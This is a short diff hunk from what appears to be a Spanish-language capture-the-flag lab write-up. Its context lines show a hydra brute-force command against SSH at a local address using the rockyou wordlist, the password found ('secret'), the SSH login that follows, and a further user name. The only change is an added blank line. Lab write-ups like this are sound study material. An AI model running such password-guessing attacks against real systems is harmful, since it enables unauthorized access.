@@ -22,6 +22,7 @@ hydra -l "a" -P /home/ankb/Documents/rockyou.txt ssh://172.17.0.2
 Encontramos la contrasena para el usuario y enctramos por ssh.
 
 ssh a@172.17.0.2
+
 secret
 
 Si vemos los usuarios que existen, encontramos spencer.
